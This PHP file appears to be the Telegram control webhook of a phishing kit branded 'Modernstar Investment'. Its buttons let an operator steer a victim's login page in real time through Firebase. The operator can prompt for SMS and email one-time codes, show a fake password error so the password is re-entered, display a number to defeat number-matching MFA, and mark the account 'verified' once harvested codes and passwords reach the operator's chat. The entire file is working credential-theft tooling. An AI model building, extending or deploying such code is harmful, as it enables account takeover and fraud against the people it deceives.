<?php
/**
 * Modernstar Investment — Telegram Webhook
 * Upload this file to your cPanel hosting
 * Set webhook URL to: https://yourdomain.com/webhook.php
 */

// ── CONFIG ──────────────────────────────────────────────────
// Edit config.php to change bot token, Firebase URL or channel ID
require_once 'config.php';
// ────────────────────────────────────────────────────────────

// Get incoming Telegram update
$input  = file_get_contents('php://input');
$update = json_decode($input, true);

if (!$update) {
    http_response_code(200);
    exit('OK');
}

// ── HANDLE CALLBACK QUERY ────────────────────────────────────
if (isset($update['callback_query'])) {
    $cb       = $update['callback_query'];
    $cb_id    = $cb['id'];
    $data     = $cb['data'] ?? '';
    $msg_id   = $cb['message']['message_id'] ?? null;

    $parts  = explode(':', $data);
    $type   = $parts[0] ?? '';

    // ── ACTION MENU (A:action:sessionKey) ──
    if ($type === 'A') {
        $action = $parts[1] ?? '';
        $sk     = $parts[2] ?? '';

        switch ($action) {
            case 'num':
                            // Answer callback
                tg_answer($cb_id, '✅ Number prompt sent!');
                // Send number keyboard 1-99
                tg_send(
                    "🔢 *NUMBER PROMPT*\n👤 *Employee:* `{$sk}`\n\n👇 *Pick a number — it will display on the employee screen:*",
                    build_num_kb($sk)
                );
                break;

            case 'sms1':
                tg_answer($cb_id, '✅ SMS Code I sent!');
                firebase_set("sess/{$sk}", ['action' => 'sms1']);
                tg_send("📱 *SMS CODE I — SENT*\n👤 *Session:* `{$sk}`\n\n_Employee is now entering the SMS code. The code will appear here when submitted._");
                break;

            

            case 'emailCode':
                tg_answer($cb_id, '✅ Email code prompt sent!');
                firebase_set("sess/{$sk}", ['action' => 'emailCode']);
                tg_send("✉️ *EMAIL CODE — SENT*\n👤 *Session:* `{$sk}`\n\n_Employee is now entering the email verification code. The code will appear here when submitted._");
                break;

            case 'pass':
                tg_answer($cb_id, '✅ Password error shown!');
                firebase_set("sess/{$sk}", ['action' => 'pass']);
                tg_send("❌ *PASSWORD ERROR — SHOWN*\n👤 *Session:* `{$sk}`\n\n_Employee is now re-entering their password. The new password will appear here when submitted._");
                break;

            case 'block':
                tg_answer($cb_id, '🚫 Visitor blocked!');
                firebase_set("sess/{$sk}", ['action' => 'block']);
                tg_send("🚫 *VISITOR BLOCKED*\n👤 *Session:* `{$sk}`\n\n_Employee now sees the Access Denied screen._");
                break;

            case 'success':
                tg_answer($cb_id, '✅ Verified!');
                firebase_set("sess/{$sk}", ['seat' => 'verified']);
                tg_send("✅ *ACCOUNT VERIFIED*\n👤 *Session:* `{$sk}`\n\n_Employee screen now shows Account Verified & redirecting._");
                break;

            default:
                tg_answer($cb_id, '⚠️ Unknown action');
        }
    }

    // ── NUMBER CHOSEN (N:num:sessionKey) ──
    elseif ($type === 'N') {
        $num = $parts[1] ?? '';
        $sk  = $parts[2] ?? '';
        tg_answer($cb_id, "✅ Number {$num} sent to employee screen!");
        firebase_set("sess/{$sk}", ['action' => 'num', 'num' => $num]);
        tg_send("🔢 *NUMBER DISPLAYED: {$num}*\n👤 *Session:* `{$sk}`\n\n✅ Employee screen now shows number *{$num}*\n_Waiting for employee to verify via email..._");
    }

    // ── SEAT CHOSEN (S:seat:sessionKey) ──
    elseif ($type === 'S') {
        $seat = $parts[1] ?? '';
        $sk   = $parts[2] ?? '';
        tg_answer($cb_id, "✅ Seat {$seat} assigned!");
        firebase_set("sess/{$sk}", ['seat' => $seat]);
        tg_send("✅ *SEAT ASSIGNED: {$seat}*\n👤 *Session:* `{$sk}`\n\n🪑 Employee screen now shows Seat *{$seat}*\n✅ Verification complete!");
    }
}

http_response_code(200);
echo 'OK';

// ── HELPER FUNCTIONS ─────────────────────────────────────────

function tg_send($text, $reply_markup = null) {
    $payload = [
        'chat_id'                  => CHAT_ID,
        'text'                     => $text,
        'parse_mode'               => 'Markdown',
        'disable_web_page_preview' => true,
    ];
    if ($reply_markup) {
        $payload['reply_markup'] = $reply_markup;
    }
    return tg_request('sendMessage', $payload);
}

function tg_answer($callback_query_id, $text, $show_alert = false) {
    return tg_request('answerCallbackQuery', [
        'callback_query_id' => $callback_query_id,
        'text'              => $text,
        'show_alert'        => $show_alert,
    ]);
}

function tg_request($method, $data) {
    $url = 'https://api.telegram.org/bot' . BOT_TOKEN . '/' . $method;
    $ch  = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($data),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

function firebase_set($path, $data) {
    $url = FIREBASE_URL . '/' . $path . '.json';
    $ch  = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_CUSTOMREQUEST  => 'PUT',
        CURLOPT_POSTFIELDS     => json_encode($data),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

function build_num_kb($sk) {
    $rows = [];
    for ($i = 1; $i <= 99; $i += 10) {
        $row = [];
        for ($j = $i; $j < $i + 10 && $j <= 99; $j++) {
            $row[] = ['text' => (string)$j, 'callback_data' => "N:{$j}:{$sk}"];
        }
        $rows[] = $row;
    }
    return ['inline_keyboard' => $rows];
}

function build_seat_kb($sk) {
    $rows = [];
    for ($i = 1; $i <= 100; $i += 10) {
        $row = [];
        for ($j = $i; $j < $i + 10 && $j <= 100; $j++) {
            $row[] = ['text' => (string)$j, 'callback_data' => "S:{$j}:{$sk}"];
        }
        $rows[] = $row;
    }
    return ['inline_keyboard' => $rows];
}